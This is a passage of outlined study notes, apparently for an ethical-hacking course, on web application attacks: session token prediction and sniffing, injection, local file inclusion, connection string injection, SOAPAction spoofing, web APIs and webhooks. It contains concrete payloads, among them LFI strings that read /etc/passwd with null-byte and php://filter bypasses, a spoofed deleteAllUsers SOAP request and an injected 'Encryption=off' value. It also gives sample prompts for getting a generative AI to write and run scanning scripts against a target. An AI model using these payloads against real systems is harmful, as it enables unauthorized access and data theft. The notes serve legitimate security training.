		- By exploiting weaknesses in session management, attackers can bypass even the most robust authentication controls, impersonate legitimate users without knowing their credentials (e.g., usernames and passwords), and, in severe cases, gain control over an entire application by compromising an administrator’s session.
		- Session Token Vulnerabilities:
			- Session Token Generation:
				- Session Token Prediction
				- Session Token Tampering
			- Session Token Handling:
				- Man-in-the-Middle Attack
				- Session Replay
				- Session hijacking
		- Session Management Attacks:
			- A session management attack is a technique used by attackers to compromise a web application by exploiting weaknesses in its session management mechanism. By bypassing authentication controls, attackers can impersonate privileged users and gain unauthorized access. This attack consists of two main stages: session token generation and exploitation of session token handling.
			- Session Token Generation Attacks:
				- To generate a valid session token, attackers use the following methods:
				- Session Token Prediction: Attackers analyze the session ID pattern used by the server. If session tokens follow a deterministic or predictable pattern, an attacker can derive previous and future session IDs, allowing them to hijack active sessions and impersonate users.
				- Session Token Tampering: Once attackers obtain valid session IDs, they can manipulate session data to escalate privileges, perform unauthorized transactions, or access restricted resources.
			- Exploiting Session Token Handling:
				- Once a valid session token is obtained, attackers exploit session handling mechanisms through:
				- Man-in-the-Middle (MITM) Attack:
					- Attackers intercept communication between the client and server, splitting the connection into two:
						- One between the client and the attacker.
						- Another between the attacker and the server.
					- The attacker then acts as a proxy, monitoring and potentially altering the exchanged data.
				- Session Hijacking:
					- Attackers steal a valid session ID from a trusted website—often through methods like cross-site scripting (XSS) or network sniffing—and use it to impersonate the user.
				- Session Replay:
					- Attackers capture a legitimate session token and reuse it to gain unauthorized access. If the application does not implement token expiration or replay protection mechanisms, the attacker can repeatedly use the same session ID to access the victim’s account.
		- Attacking the Session Token Generation Mechanism:
			- In a session management attack, attackers attempt to determine the session token generation mechanism by stealing valid session tokens and predicting future tokens.
			- Through session prediction, attackers analyze patterns in session tokens exchanged between the client and server. This vulnerability arises when a web application generates weak or predictable session identifiers. For example, if the application assigns session tokens sequentially, an attacker can deduce past and future session tokens simply by knowing a single valid session ID. Before attempting prediction, attackers must first obtain a sample of valid session tokens from legitimate system users.
			- Vulnerabilities in Session Token Generation:
				- Weak Encoding Example:
					- If a session token is weakly encoded, an attacker may be able to manipulate it and predict valid tokens.
					- For instance, consider a session token encoded using hex encoding for the following ASCII string: user=jason;app=admin;date=08/01/2020
					- If the web application does not enforce strong encoding or token randomness, an attacker can predict and modify session tokens, such as by changing the date parameter to perform unauthorized transactions.
					- Example request: https://www.certifiedhacker.com/checkout?SessionToken=%75%73%65%72%3D%6A%61%73%6F%6E%3B%61%70%70%3D%61%64%6D%69%6E%3B%64%61%74%65%3D%30%38%2F%30%31%2F%32%30%32%30
					- By modifying the encoded date value, the attacker may generate a valid session token for another transaction.
				- Session Token Prediction:
					- Attackers follow these steps to predict session tokens:
						- Obtain valid session tokens: Capture tokens by sniffing network traffic or logging into the application and analyzing session token encoding (e.g., hex encoding, Base64).
						- Analyze session token patterns: If session tokens follow a predictable structure, attempt to reverse-engineer their logic.
						- Make large numbers of requests: Use the predicted tokens to access a session-dependent page and determine which tokens are valid.
			- Attacking the Session Token Handling Mechanism: Session Token Sniffing:
				- Session token sniffing is a technique used by attackers to capture valid session tokens from network traffic and exploit them to gain unauthorized access to a web application. Once a valid session token is obtained, attackers can predict future session tokens or use the captured token to authenticate themselves as legitimate users.
				- Steps for Session Token Sniffing:
					- Capture network traffic using a sniffing tool like Wireshark or an intercepting proxy such as Burp Suite.
					- Analyze session tokens in HTTP traffic. If session tokens are transmitted via unencrypted HTTP cookies and the secure flag is not set, attackers can replay the cookie to gain unauthorized access.
					- Exploit the captured session token to perform various attacks, including:
						- Session Hijacking: Taking over an active user session.
						- Session Replay: Reusing a valid session token to authenticate as another user.
						- Man-in-the-Middle (MITM) Attack: Intercepting and modifying session data in transit.
				- Importance of Session Token Sniffing in Session Management Attacks: Sniffing valid session tokens is a crucial step in compromising web applications that lack secure session management practices.
				- Wireshark: Wireshark is a powerful network protocol analyzer that captures and inspects live network traffic. It supports multiple network protocols, including Ethernet, IEEE 802.11 (Wi-Fi), PPP/HDLC, ATM, Bluetooth, USB, Token Ring, Frame Relay, and FDDI. Attackers can use Wireshark to intercept and analyze session IDs transmitted between clients and a target web application.
			- Manipulating WebSocket Traffic (PortSwigger):
				- Attackers use Burp Suite to manipulate WebSocket traffic by intercepting, modifying, and replaying WebSocket messages using the Burp Repeater feature.
				- Steps to Manipulate WebSocket Traffic Using Burp Suite:
					- Open Burp Suite and enable interception.
					- Browse an application that uses WebSockets for communication.
					- Navigate to Proxy -> WebSockets history to view WebSocket messages.
					- Right-click on a WebSocket message you want to manipulate and select “Send to Repeater.”
					- Open the Repeater tab. The History panel will display all messages exchanged over the WebSocket connection.
					- Click the pencil icon next to the WebSocket URL, select WebSocket from the Select WebSocket window, and click Clone to duplicate the connection.
					- Modify the raw request as needed and click Connect. Burp Suite will attempt to establish the manipulated handshake.
					- Check the new WebSocket connection by clicking the pencil icon again to confirm if it was successfully established and can send new messages.
					- Once the connection is established, click Send in the main window to transmit the modified WebSocket message to the server.
	- Perform Injection Attacks (Input Validation Attacks):
		- Injection attacks are among the most common threats to web applications. They exploit weaknesses in input validation mechanisms implemented by the application. Various types of injection attacks exist, including web script injection, OS command injection, SMTP injection, LDAP injection, and XPath injection. One of the most frequently occurring injection attacks is SQL injection.
		- Injection attacks typically occur when a browser sends user-supplied data to an interpreter as part of a command or query. To execute an injection attack, attackers craft malicious input that manipulates the interpreter into executing unintended commands or queries. Due to these vulnerabilities, attackers can read, create, modify, or delete arbitrary data within the application. In some cases, they may even bypass deeply nested firewalls and gain complete control over the application and its underlying system.
		- To perform an injection attack, supply crafted malicious input that conforms to the syntax of the interpreted language used by the application. This input is designed to break the application's normal operation and execute unintended commands.
		- Common Types of Injection Attacks:
			- Web Script Injection: If user input is executed dynamically as code, supply crafted input that alters the intended data context and executes commands on the server.
			- OS Command Injection: Exploit applications that incorporate user input into system-level commands by injecting malicious code into input fields.
			- SMTP Injection: Inject arbitrary SMTP commands into an application or SMTP server conversation to send spam or manipulate email behavior.
			- SQL Injection: Enter malicious SQL queries into input fields to directly manipulate a database.
			- LDAP Injection: Exploit web application vulnerabilities that fail to validate input by injecting LDAP filters to gain unauthorized access to directories or databases.
			- XPath Injection: Manipulate XPath queries by entering malicious input, interfering with the application's logic and data retrieval process.
			- Buffer Overflow: Overload input fields by injecting excessive data, exceeding the allocated buffer size and potentially crashing the application.
			- File Injection: Exploit dynamic file inclusion mechanisms in web applications to inject malicious files.
			- Canonicalization Attack: Manipulate file path references using techniques like “dot-dot-slash (../)” to access restricted directories within the application.
		- Performing Local File Inclusion (LFI):
			- Local File Inclusion (LFI) is a web security vulnerability that allows attackers to read and upload files onto a server via a web browser. This vulnerability can be exploited to access or replace locally available files on the server, including configuration files, code files, logs, and other sensitive data.
			- LFI occurs when an application includes files based on user input without proper validation or security checks. Attackers manipulate the input by injecting path traversal characters (../) to access restricted files. This vulnerability is commonly found in PHP-based websites.
			- Example of LFI in PHP:
				- Evading Added .php and Other Extensions:
					- File extensions are often appended using PHP code:
						$file = $_GET['page'];  
						require($file . ".php");
					- An attacker can evade the .php extension by appending a null byte (%00) at the end of the attack string: http://xyz.com/page=../../../../../../etc/passwd%00
					- Another method to bypass the added .php extension is by appending a question mark (?) to the attack string: http://xyz.com/page=../../../../../../etc/passwd?
				- Bypassing .php Execution:
					- LFI vulnerabilities allow attackers to read .txt files but not .php files, as .php files are executed by the server instead of being displayed as raw text.
					- This restriction can be bypassed using the PHP filter wrapper to encode the file in Base64: http://xyz.com/index.php?page=php://filter/convert.base64-encode/resource=index
					- This method encodes the index.php file in Base64, allowing attackers to decode and analyze it offline.
	- Exploit Application Logic Flaws:
		- Web applications rely on complex logic at multiple levels. Some implementations of this logic may contain vulnerabilities that are not easily noticeable. While most attackers focus on high-profile threats such as SQL Injection and Cross-Site Scripting (XSS)—which have identifiable signatures—application logic flaws are more difficult to detect because they do not follow common attack patterns.
		- Traditional vulnerability scanners and automated testing tools often fail to identify logic flaws, making them particularly dangerous. Attackers can exploit these vulnerabilities to cause significant damage to web applications. Such flaws typically arise due to developer negligence and false assumptions about how users will interact with the application. Since application logic flaws vary across different types of web applications, they cannot be categorized under a single vulnerability type. Studying previously exploited applications with known logic flaws can provide valuable insights into how to identify and exploit these weaknesses.
		- Scenario: Exploiting Logic Flaws in Retail Web Applications:
			- Many retail web applications follow a standard process for placing an order:
				- Selecting a product
				- Finalizing the order
				- Providing payment details
				- Providing delivery details
			- Developers assume that users will complete these steps in sequence. However, attackers can manipulate requests to bypass critical stages.
			- By using proxy tools such as Burp Suite, an attacker can intercept and modify HTTP requests sent to the application. One effective technique is forced browsing, where an attacker skips the payment stage by jumping directly from the order confirmation step to the delivery confirmation step.
			- Impact: This exploit allows attackers to obtain products without making a payment, leading to severe financial losses for the business—especially if the attack is automated on a large scale.
	- Attacking Shared Environments:
		- Many organizations rely on third-party service providers to host and maintain their web applications and related infrastructure. These providers host multiple clients' applications on the same infrastructure, creating potential security risks. For instance, a malicious client may attempt to compromise another organization’s web application, or a vulnerable application deployed by one client could expose other applications to security breaches.
		- Potential Attacks on Shared Environments:
			- Attacks on the Access Mechanism:
				- Service providers often offer an administrative web interface that allows organizations to remotely configure and manage their web applications and databases. However, this remote access mechanism is prone to security vulnerabilities.
				- Exploiting Unpatched Vulnerabilities:
					- Check for unpatched security flaws or misconfigurations in the remote access system.
					- Attackers can exploit these weaknesses to steal credentials and gain unauthorized access to applications and databases.
				- Privilege Misconfiguration:
					- Ensure that access privileges are correctly configured between different clients.
					- For example, improper settings might grant shell access instead of restricted file access, allowing attackers to view or modify sensitive files stored on the web server.
			- Attacks Between Applications:
				- In shared environments, a vulnerability in one application can allow attackers to compromise others.
				- Remote Code Execution (RCE):
					- Attackers may exploit vulnerabilities in a neighboring application to execute malicious scripts and gain control over other hosted applications.
					- Example: A script that allows remote command execution could be used to run OS commands such as whoami.
				- SQL Injection Attacks:
					- A SQL injection vulnerability in one application could be used to execute arbitrary SQL queries, retrieve sensitive data, and manipulate records from other applications within the shared environment.
		- Conclusion: Poorly secured shared environments pose significant security risks. A single vulnerability in one client’s application can compromise the security of multiple organizations. Proper access control, privilege separation, and regular security assessments are essential to mitigating these risks.
	- Attacking Database Connectivity:
		- Database connection strings are used to link applications to database engines. In these attacks, attackers target the database connection, which serves as a bridge between a database server and its client software. A web application establishes a connection to the database by providing a driver with a connection string. This string contains the address of a specific database or server, along with instance details and user authentication credentials.
		- For example: Server=sql_box; Database=Common; User ID=uid; Pwd=password;
		- Attacking database connectivity can lead to unauthorized control over the database. Such attacks grant attackers access to sensitive database information by exploiting the way applications connect to databases, rather than manipulating database queries. Common attack methods include connection string injection, hash stealing, port scanning, and hijacking web credentials.
		- The following is an example of a typical connection string used to connect to a Microsoft SQL Server database:
			Data Source=Server,Port; Network Library=DBMSSOCN; Initial Catalog=DataBase; User ID=Username; Password=pwd;
		- Types of Data Connectivity Attacks:
			- Connection String Injection: In a delegated authentication environment, attackers manipulate connection strings by injecting parameters, often using a semicolon to append them. This typically occurs when dynamic string concatenation is used to construct connection strings based on user input.
			- Connection String Parameter Pollution (CSPP) Attacks: Attackers modify or overwrite parameter values within the connection string, potentially altering database behavior.
			- Connection Pool Denial of Service (DoS): Attackers analyze the connection pooling settings of the target application, craft a large malicious SQL query, and execute multiple queries simultaneously. This depletes the available connections in the pool, preventing legitimate users from accessing the database.
		- Connection String Injection:
			- A connection string injection attack occurs when a server dynamically concatenates user input to build connection strings without proper validation or escaping of malicious characters. If the server fails to sanitize the input, an attacker can manipulate the connection string to access sensitive data or alter system behavior.
			- For example, an attacker could exploit this vulnerability by appending a semicolon (;) followed by an additional parameter. Using a "last one wins" parsing approach, the attacker can override legitimate values with malicious input.
			- Mitigation with Connection String Builders:
				- To prevent such attacks, connection string builder classes should be used. These classes:
				- Eliminate syntax errors and security vulnerabilities by providing predefined methods and properties for constructing connection strings.
				- Maintain a fixed collection of recognized key/value pairs, ensuring only valid parameters are allowed.
				- Automatically handle maliciously injected values safely, preventing unauthorized modifications.
			- In delegated authentication environments, attackers can easily inject parameters using semicolons (;). The following example demonstrates how an attacker disables encryption by injecting a malicious parameter into the connection string.
			- Example of Connection String Injection:
				- Before Injection: Data Source=Server,Port; Network Library=DBMSSOCN; Initial Catalog=DataBase; User ID=Username; Password=pwd;
				- After Injection: Data Source=Server,Port; Network Library=DBMSSOCN; Initial Catalog=DataBase; User ID=Username; Password=pwd; Encryption=off
				- Here, the attacker inputs the password as: pwd; Encryption=off
				- As a result, the Encryption=off parameter is appended to the connection string, potentially disabling encryption and compromising security.
			- Key Takeaway:
				- Proper validation and sanitization of user input are essential to prevent connection string injection.
				- Using connection string builder classes helps mitigate risks by enforcing strict parameter validation.
		- Connection Pool Denial of Service (DoS):
			- A Connection Pool DoS attack exploits an application's connection pooling settings by executing multiple long-running queries simultaneously, exhausting the available connections and preventing legitimate users from accessing the database.
			- Attack Method: An attacker examines the connection pool settings and crafts a malicious SQL query designed to run for an extended period. By executing multiple such queries in parallel, they consume all available connections in the pool, leading to service disruption.
			- Example:
				- In ASP.NET, the default maximum number of connections in a pool is 100, with a timeout of 30 seconds. An attacker can:
				- Execute 100 queries, each with an execution time of 30+ seconds.
				- Ensure all queries run within 30 seconds to deplete the connection pool.
				- As a result, legitimate users will be unable to perform database-related operations until the connections are released.
			- Mitigation Strategies:
				- Limit query execution time using timeouts and resource limits.
				- Implement connection pooling limits with adaptive thresholds to prevent abuse.
				- Monitor and log excessive database queries to detect abnormal behavior.
				- Use rate limiting and CAPTCHA to prevent automated DoS attempts.
	- Attack Web Application Clients:
		- Server-side attacks can compromise client-side applications when the latter interact with malicious servers or process harmful data. Client-side attacks occur when a client establishes a connection with a compromised or malicious server. If there is no connection between the client and server, the risk is eliminated, as the server cannot pass malicious data to the client.
		- A common example of a client-side attack involves an infected web page exploiting a specific browser vulnerability. If successful, this allows the malicious server to gain unauthorized control over the client system. Attackers often manipulate server-side applications in unexpected ways to execute malicious actions against users and access sensitive data.
		- Common Methods For Compromising Web Application Clients (Client-Side Attack Techniques):
			- Cross-Site Scripting (XSS): Attackers bypass security mechanisms to inject malicious scripts into web pages. These scripts can steal user credentials, modify page content, or execute harmful actions on behalf of the user.
			- HTTP Header Injection: Attackers manipulate HTTP headers to split a response into multiple forged responses, which can lead to website defacement, cache poisoning, and cross-site scripting (XSS) attacks.
			- Request Forgery Attacks (CSRF): Attackers exploit the trust relationship between a website and a user's browser. They craft malicious links or forms that, when clicked, trigger unauthorized actions on an authenticated website without the user’s consent.
			- Privacy Attacks: Attackers track users by exploiting browser vulnerabilities or persistent states (e.g., cookies, local storage). This can lead to unauthorized user profiling and tracking.
			- Redirection Attacks: Attackers create fake links that appear legitimate but redirect users to malicious websites. These fake sites can be used for credential theft (phishing) or malware distribution.
			- Frame Injection Attacks: Attackers inject malicious code into frames of an HTML page when input validation is inadequate. Since modern browsers support frame editing, untrusted input can be exploited to manipulate website content and deceive users.
			- Session Fixation: Attackers force a user to use a predefined session ID, then hijack the session once the user logs in. This allows the attacker to impersonate the victim and access their authenticated session.
			- ActiveX Attacks: Attackers trick users into installing malicious ActiveX controls through email or deceptive links. Exploiting remote code execution vulnerabilities, attackers gain the same level of access privileges as the authenticated user.
	- Attacking Web Services (Exploit Vulnerabilities in Web Services):
		- Web applications often rely on web services to implement specific functionalities. If these integrated web services contain vulnerabilities, the entire application becomes susceptible to exploitation. Attackers can take advantage of such weaknesses, making web services a prime target for cyber threats. Compromised web services pose a significant security risk.
		- Web services operate on top of legacy web applications, meaning any attack on a web service can immediately expose an underlying application's business logic and security flaws. Attackers use various techniques to target web services, as these services are made accessible through different mechanisms. This broad accessibility increases the likelihood of vulnerabilities, which attackers exploit to compromise web services.
		- There are multiple reasons why attackers target web services. The choice of attack method depends on the attacker's objective. For example, if the goal is to disrupt a web service and prevent it from functioning, attackers may launch a Denial-of-Service (DoS) attack by overwhelming the service with numerous requests.
		- Web Service Probing Attacks:
			- Web Services Description Language (WSDL) files are automated documents that contain sensitive information about service ports, connections between electronic systems, and other critical details. Attackers use WSDL probing attacks to gather intelligence about vulnerabilities in public and private web services, which can then be leveraged to execute SQL injection and other attacks.
			- Steps For Web Service Probing Attack:
				- Extracting WSDL Data: The attacker captures the WSDL document from web service traffic and analyzes it to understand the application's purpose, functional breakdown, entry points, and message types.
				- Creating Valid Requests: The attacker selects specific operations and formulates request messages according to the XML schema rules, allowing them to interact with the web service.
				- Injecting Malicious Content: Malicious content is embedded into SOAP requests to exploit vulnerabilities. The attacker then analyzes error messages to gain deeper insights into potential security weaknesses.
			- By leveraging these probing techniques, attackers can identify security flaws and craft targeted attacks against vulnerable web services.
		- Web Service Attacks: SOAP Injection:
			- Simple Object Access Protocol (SOAP) is a lightweight, XML-based protocol designed for exchanging structured and typed information over the web. In the XML schema, the envelope element is always the root element of a SOAP message.
			- SOAP injection involves inserting special characters—such as single quotes, double quotes, semicolons, and other symbols—into SOAP messages. Attackers inject malicious query strings into user input fields to bypass web service authentication mechanisms and gain unauthorized access to backend databases. This attack functions similarly to SQL injection, exploiting weaknesses in input validation to manipulate web services.
		- Web Service Attacks: SOAPAction Spoofing:
			- Every SOAP request message contains an operation that the application executes, which is included as the first child element in the SOAP body. When SOAP messages are transmitted over HTTP, an additional HTTP header called SOAPAction is used. This header specifies the operation to be executed, allowing the receiving web service to identify the operation without performing XML parsing.
			- Attackers can exploit this optimization by manipulating the operations included in the SOAPAction header, effectively deceiving the web service into executing unintended operations.
			- Example of SOAPAction Spoofing Attack:
				- Consider a web service with two operations:
					- createUser – Allows the creation of new users
					- deleteAllUsers – Deletes all users (restricted to authorized users)
				- In this scenario, the web service is protected by a gateway that only permits authorized users to execute the deleteAllUsers operation. However, an attacker outside the gateway can perform a SOAPAction spoofing attack by modifying the SOAPAction header as follows:
					- Legitimate HTTP Request for Creating a User:
						POST /service HTTP/1.1
						Host: certifiedHacker
						SOAPAction: "createUser"

						<Envelope>
							<Header />
							<Body>
								<createUser>
								<login>rinnimathews</login>
								<pwd>password</pwd>
								</createUser>
							</Body>
						</Envelope>
				- Spoofed HTTP Request Exploiting SOAPAction:
					- The attacker modifies the SOAPAction header to "deleteAllUsers" while keeping the SOAP body unchanged. Since the gateway relies on the header and does not validate the body, it processes the request incorrectly.
						POST /service HTTP/1.1
						Host: certifiedHacker
						SOAPAction: "deleteAllUsers"

						<Envelope>
							<Header />
							<Body>
								<createUser>
								<login>rinnimathews</login>
								<pwd>password</pwd>
								</createUser>
							</Body>
						</Envelope>
					- As a result, the system executes the deleteAllUsers operation, despite the SOAP body containing a createUser request. This vulnerability can lead to severe security breaches if not properly mitigated.
			- Tools for Performing SOAPAction Spoofing Attacks:
				- Attackers use tools like WS-Attacker to conduct SOAPAction spoofing attacks.
				- WS-Attacker: WS-Attacker is an open-source tool for automating penetration tests on web services. It supports multiple attack types through plugins and provides a security-checking interface. It can load WSDL files, send SOAP messages to web service endpoints, and test for vulnerabilities such as XML signature wrapping, SOAPAction spoofing, and DoS attacks.
		- Web Service Attacks: WS-Address Spoofing:
			- WS-Addressing provides additional routing information in the SOAP header to support asynchronous communication. This mechanism allows web service requests and responses to be transmitted using different TCP connections, making it essential for long-running service requests where server-side processing exceeds the lifetime of a single TCP connection.
			- WS-Addressing includes an optional FaultTo element, which specifies an alternative endpoint to be used in case of communication failures. However, since the ReplyTo and FaultTo headers are selected by the requester, they are not properly secured against tampering by intermediaries. Although the specification recommends applying digital signatures to these header fields, security often relies on default settings, which lack proper safeguards.
			- This vulnerability allows attackers to perform WS-Address spoofing attacks. In such an attack, the attacker sends a SOAP message containing fake WS-Address information to the server. The ReplyTo header contains the attacker’s chosen endpoint instead of the legitimate web service client. As a result, the attacker’s endpoint receives unnecessary SOAP message traffic.
			- Additionally, the attacker can exploit this vulnerability to generate massive amounts of traffic, potentially leading to a Denial-of-Service (DoS) attack.
			- Exploiting WS-Addressing Vulnerabilities: Attackers use tools like WS-Attacker to identify and exploit WS-Addressing spoofing vulnerabilities.
		- Web Service Attacks: XML Injection:
			- Web applications often use XML to store data, such as user credentials, in XML documents. Attackers can exploit this by using XPath, a query language that defines the structure of XML documents and is often used for verifying user credentials (e.g., usernames and passwords) to grant access to specific user accounts.
			- In an XML injection attack, attackers manipulate XPath queries by injecting malicious XML data or schema into input fields. This allows them to bypass authentication mechanisms and gain unauthorized access to sensitive data stored in XML. By crafting specific queries, attackers can exploit vulnerabilities in how applications process XML data.
			- Attackers can also inject malicious XML tags into user input fields to manipulate the XML schema, alter database entries, or populate XML databases with bogus data. XML injection can be used for various purposes, including:
				- Bypassing authentication to gain unauthorized access
				- Escalating privileges within a system
				- Launching Denial-of-Service (DoS) attacks on web services
			- Proper input validation and secure XPath query handling are essential to mitigating XML injection attacks.
		- Web Service Attacks: Parsing Attacks:
			- Parsing attacks exploit vulnerabilities in the XML parser by overloading its processing capabilities, leading to Denial-of-Service (DoS) attacks or logical errors in web service request processing. These attacks occur when an attacker modifies file requests or strings to manipulate how the parser processes data.
			- Attackers can execute parsing attacks by injecting .bat (batch) or .cmd (command) files, superimposing malicious operating system commands via the request.
			- Types of Parsing Attacks:
				- Recursive Payloads: Attackers send grammatically correct SOAP requests containing infinite processing loops, which overload the XML parser and consume CPU resources, leading to system exhaustion.
				- Oversized Payloads: Attackers send excessively large payloads designed to consume all available system resources, making web services inaccessible to legitimate users.
			- Web Service Attack Tools:
				- SoapUI (www.soapui.org): SoapUI is a web service testing tool that supports multiple protocols, including SOAP, REST, HTTP, JMS, AMF, and JDBC. Attackers can use it for web service probing, SOAP injection, XML injection, and parsing attacks.
				- XMLSpy (www.altova.com): Altova XMLSpy is an XML editor and development environment used for modeling, editing, transforming, and debugging XML-related technologies.
			- Web Application Hacking Tools:
				- Metasploit (www.metasploit.com)
				- w3af (github.com)
				- Nikto (cirt.net)
				- Sn1per (github.com)
				- WSSiP (github.com)
				- Web Brutator (github.com)
				- timing_attack (github.com)
				- HTTrack (www.httrack.com)
				- SQL Injection Scanner (pentest-tools.com)
				- XSS Scanner (pentest-tools.com)
				- SQLi Exploiter (pentest-tools.com)
				- HTTP Request Logger (pentest-tools.com)
				- WebCopier (www.maximumsoft.com)
				- WPScan (wpscan.com)
				- TIDoS-Framework (github.com)
		- Create and Run Custom Scripts to Automate Web Application Hacking Tasks with AI:
			- With AI assistance, they can easily create and execute custom scripts for web application footprinting and vulnerability scanning, gaining valuable insights into their targets. By developing such scripts, attackers can efficiently perform a series of footprinting and vulnerability scanning commands to gather critical information about a target domain.
			- An attacker can also utilize AI-powered tools like ChatGPT or other generative AI technologies to create custom scripts for automation by using appropriate prompts such as:
				- "Create and run a custom script for web application footprinting and vulnerability scanning. The target URL is www.certifiedhacker.com."
				- "Create and run a custom Python script for web application footprinting and vulnerability scanning. The target URL is www.certifiedhacker.com."
				- "Create and run a custom Python script that performs web application footprinting to gather information and then uses this data to conduct vulnerability scanning on the target URL www.certifiedhacker.com."
- Web API and Webhooks:
	- Web API:
		- A Web API (Application Programming Interface) is an interface that enables client-side applications to retrieve and update data from multiple online sources. It facilitates interactions between applications over the Internet using web-based protocols. Web APIs make resources accessible online and are typically accessed via the HTTP protocol.
		- Web APIs consist of various tools, functions, and protocols that simplify software or application development. For example, consider a traditional web application supported by multiple mobile platforms but lacking a centralized API. This setup requires updating business logic separately for each platform whenever client applications change, leading to complexity. By using a centralized Web API, developers can streamline updates, ensuring consistency and efficiency by managing data and business logic from a single location.
		- Web Service APIs:
			- The most commonly used web service APIs are listed below:
    		- SOAP API: SOAP (Simple Object Access Protocol) is a web-based communication protocol that facilitates interactions between applications running on different platforms, such as Windows, macOS, and Linux, using XML and HTTP. SOAP-based APIs are designed to generate, retrieve, modify, and delete various data logs, including profiles, credentials, and business leads.
    		- REST (Representational State Transfer) API: REST is not a specification, tool, or framework but an architectural style for web services that serves as a communication medium between systems on the web. APIs that follow REST principles are known as REST APIs. These API-based systems, including web services and databases, allow requesting machines to efficiently access and modify web resource representations through stateless protocols and standardized operations.
    		- RESTful API: A RESTful API is a web service designed following REST principles and HTTP communication protocols. It consists of a collection of resources that use standard HTTP methods such as PUT, POST, GET, and DELETE. RESTful APIs enhance application performance, visibility, scalability, reliability, and portability by ensuring system independence.
				- APIs with the following characteristics are considered RESTful:
					- Stateless: The client stores the session state, while the server does not retain any data between requests.
					- Cacheable: Clients can store responses (representations) in a cache to improve API performance.
					- Client-Server Architecture: The client and server remain independent, with the server handling backend operations and the client serving as the request interface.
					- Uniform Interface: Resources must be uniquely and consistently identified via a single URL, utilizing standard HTTP methods (PUT, POST, GET, DELETE), enabling easy modification of resources.
					- Layered System: A multi-layered architecture allows intermediary servers to provide caching for improved scalability, as the client does not directly interact with the main server.
					- Code on Demand (Optional): The server can send temporary executable code to the client, allowing dynamic customization of client functionality.
    		- XML-RPC: Extensible Markup Language – Remote Procedure Call (XML-RPC) is a communication protocol that uses a specific XML format to transfer data. Unlike SOAP, which relies on proprietary XML, XML-RPC is simpler and requires less bandwidth.
    		- JSON-RPC: JavaScript Object Notation – Remote Procedure Call (JSON-RPC) functions similarly to XML-RPC but uses the JSON format instead of XML for data transfer. This makes it lightweight and efficient for communication between systems.
	- Webhooks:
		- Webhooks are user-defined HTTP callbacks or push APIs that are triggered by specific events, such as receiving a comment on a post or pushing code to a repository. A webhook enables an application to update other applications with real-time information. Once invoked, it supplies data to the receiving applications, ensuring that users receive instant updates.
		- Webhooks are sometimes referred to as "Reverse APIs" because they fulfill the requirements of an API specification, but instead of the application actively requesting data, the developer sets up an API to receive webhook notifications.
		- Webhooks are commonly used to send text messages and notifications to mobile numbers or email addresses when a specific event occurs. For example, in an online store, if an item is out of stock, a customer may click on the "Notify Me" button. Once the item becomes available, the application sends an alert via a webhook, notifying the user.
		- How Webhooks Work:
			- Webhooks are registered along with a domain through a user interface or API to notify clients when a new event occurs. The generated webhook URL contains the necessary code that executes automatically when the event takes place. Unlike traditional APIs, where the system must continuously poll for new updates, webhooks simply track the event path and generate notifications when needed.
			- Webhooks operate as isolated processes on the web. When System-2 receives a notification from the registered webhook URL, it not only becomes aware of the event but can also respond accordingly. The webhook URL can be accessed via an HTTP POST request and contains details such as the source of the event, date, time, and other relevant information.
			- Webhooks can be private or public, depending on the intended level of access and security requirements.
	- Webhooks vs. APIs:
		- Webhooks are automated messages sent from a website to a server, while APIs facilitate communication between a server and a website.
		- Webhooks send reports or notifications via HTTP POST only when an update occurs, whereas APIs make requests regardless of whether data has changed.
		- Webhooks provide real-time updates to applications or services, whereas APIs require additional implementation to achieve real-time functionality.
		- Webhooks offer limited control over data flow, while APIs allow greater control over data flow.
	- OWASP Top 10 API Security Risks (owasp.org):
		- API1: Broken Object-Level Authorization:
			- APIs often expose endpoints that manage object identifiers, increasing the risk of object-level access control vulnerabilities. Implementing strict authorization checks for every function that retrieves data based on a user-provided ID is essential.
			- Attackers can manipulate object IDs in API requests to exploit broken authorization mechanisms.
			- Unauthorized access to other users’ objects can result in data disclosure, data loss, or manipulation.
		- API2: Broken Authentication:
			- Authentication mechanisms are often misconfigured, enabling attackers to compromise authentication tokens or exploit flaws to impersonate other users.
			- Attackers can gain full control over user accounts, access personal data, and perform sensitive actions on behalf of the victim.
		- API3: Broken Object Property-Level Authorization:
			- Developers may unintentionally expose all object properties to clients without considering their sensitivity, relying on the client to filter data.
			- Unauthorized access to private or sensitive object properties can lead to data disclosure, data loss, or corruption.
			- In some cases, unauthorized access can escalate privileges or enable a full or partial account takeover.
		- API4: Unrestricted Resource Consumption:
			- Attackers can launch Denial-of-Service (DoS) attacks by sending multiple concurrent requests using automated tools, overwhelming API services.
			- APIs that lack rate limits or resource consumption controls are vulnerable to abuse, allowing attackers to craft requests that deplete system resources.
		- API5: Broken Function-Level Authorization:
			- Complex access control policies across different user hierarchies, groups, and roles can lead to authorization misconfigurations.
			- Attackers may exploit these misconfigurations to gain unauthorized access to administrative functions or restricted user resources.
		- API6: Unrestricted Access to Sensitive Business Flows:
			- APIs vulnerable to this risk expose critical business operations, such as purchasing tickets or posting comments, without safeguards against excessive or automated abuse.
			- Attackers analyze API workflows, identify key resources, and automate interactions to exploit business logic.
			- This can result in financial loss, fraudulent transactions, or service disruptions.
		- API7: Server-Side Request Forgery (SSRF):
			- A Server-Side Request Forgery (SSRF) vulnerability allows attackers to manipulate an API into sending crafted requests to unauthorized destinations, even bypassing firewalls and VPNs.
			- Attackers exploit APIs that accept user-supplied URLs, leading to internal network scanning, information disclosure, and firewall bypassing.
			- Exploitation can expose internal services, open ports, and sensitive system configurations.
		- API8: Security Misconfiguration:
			- Attackers look for unpatched vulnerabilities, insecure default configurations, exposed endpoints, or unprotected directories to gain unauthorized access.
			- Automated tools are commonly used to detect and exploit misconfigurations, such as unnecessary services or outdated security settings.
			- Security misconfigurations can expose sensitive user data and critical system details, potentially leading to a full server compromise.
		- API9: Improper Inventory Management:
			- Proper tracking of hosts, API versions, and deployed services is essential for mitigating security risks.
			- Attackers often target outdated API versions or unpatched endpoints with weaker security controls.
			- When multiple API versions connect to the same database with real data, attackers can gain unauthorized access, extract sensitive information, or take control of the server.
		- API10: Unsafe Consumption of APIs:
			- Developers often trust data from third-party APIs more than user input, leading to weaker security practices.
			- Attackers may exploit vulnerabilities in third-party integrations instead of directly targeting the main API.
			- Successful exploitation can result in sensitive data leaks, injection attacks, or denial-of-service incidents.
	- Webhooks Security Risks:
		- Webhooks, while efficient for real-time data transfer between applications, can introduce security vulnerabilities if not properly secured. Below are some common risks associated with webhooks and strategies to mitigate them:
		- Data Exposure in Transit:
			- Webhooks may transmit data in plain text over HTTP, making it vulnerable to interception and tampering.
			- Mitigation: Always use HTTPS to encrypt data in transit and protect it from exposure or unauthorized access.
		- Lack of Verification:
